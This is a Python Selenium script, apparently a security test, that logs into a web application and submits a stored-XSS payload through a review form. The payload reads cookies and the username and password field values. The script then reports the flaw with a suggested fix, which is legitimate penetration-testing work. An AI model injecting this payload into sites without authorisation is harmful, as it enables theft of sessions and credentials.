import time

from selenium import webdriver
from selenium.webdriver.common.by import By

from config.config import LOGIN_URL, REVIEW_URL, USERNAME, PASSWORD
from report_generator import generate_detailed_report
from utils import capture_sensitive_data


def run_vulnerability_xss_test():
    driver = webdriver.Chrome()

    try:
        # Step 1: Login
        driver.get(LOGIN_URL)
        time.sleep(2)
        driver.find_element(By.XPATH, '/html/body/div[1]/form/div[1]/input').send_keys(USERNAME)
        driver.find_element(By.XPATH, '/html/body/div[1]/form/div[2]/input').send_keys(PASSWORD)
        driver.find_element(By.XPATH, '/html/body/div[1]/form/input').click()
        time.sleep(3)

        # Step 2: Navigate to test page and submit data
        page_name = 'Review Page'
        driver.get(REVIEW_URL)
        time.sleep(2)

        # Inject script to capture cookies, username, and password if present
        xss_payload = """
            <script>
                alert("XSS Attack! Collecting sensitive data...");
                var cookies = document.cookie;
                var username = document.querySelector("input[name='username']") ? document.querySelector("input[name='username']").value : "not found";
                var password = document.querySelector("input[name='password']") ? document.querySelector("input[name='password']").value : "not found";
                console.log("Cookies: " + cookies);
                console.log("Username: " + username);
                console.log("Password: " + password);
            </script>
        """
        driver.find_element(By.XPATH, '/html/body/section[2]/div/form/textarea').send_keys(xss_payload)
        driver.find_element(By.XPATH, '/html/body/section[2]/div/form/button').click()
        time.sleep(2)

        # Step 3: Capture sensitive data and generate report
        vulnerabilities = []
        page_source = driver.page_source
        captured_data = capture_sensitive_data(driver)

        if "XSS Attack" in page_source:
            vulnerabilities.append({
                'type': 'XSS',
                'description': 'Cross-Site Scripting (XSS) vulnerability found in the form submission.',
                'impact': 'Allows attackers to execute arbitrary scripts in the context of the user session.',
                'fix': 'Sanitize user input and use HTML encoding to prevent script injection.',
                'location': 'Review form on the review page'
            })

            generate_detailed_report(True, page_name, vulnerabilities, captured_data, page_source)
        else:
            generate_detailed_report(False, page_name, vulnerabilities)
    finally:
        driver.quit()
